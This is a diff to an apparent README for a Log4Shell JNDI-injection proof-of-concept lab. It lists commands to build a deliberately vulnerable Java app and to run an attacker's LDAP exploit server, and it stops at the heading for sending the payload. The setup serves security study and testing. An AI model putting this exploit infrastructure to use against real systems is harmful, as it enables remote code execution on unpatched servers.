@@ -91,21 +91,21 @@ https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/
 [@christophetd](https://twitter.com/christophetd)
 [@rayhan0x01](https://twitter.com/rayhan0x01)
 
-## TL;DR POC (Windows)
+## TL;DR POC/easy start
 
 ### Start vulnerable target
 
     git clone https://github.com/HenryFBP/log4shell-vulnerable-app
     cd log4shell-vulnerable-app
     gradle clean bootJar --no-daemon
-    start cmd.exe /k java -jar ./build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar
+    java -jar ./build/libs/log4shell-vulnerable-app-0.0.1-SNAPSHOT.jar
 
 ### Start attacker's LDAP server
 
     git clone https://github.com/HenryFBP/JNDI-Exploit-Server
     cd JNDI-Exploit-Server
     mvn clean package
-    start cmd.exe /k java -jar JNDIExploit.jar
+    java -jar JNDIExploit.jar
 
 ### Send payload to vulnerable target (need GNU curl.exe...)
 
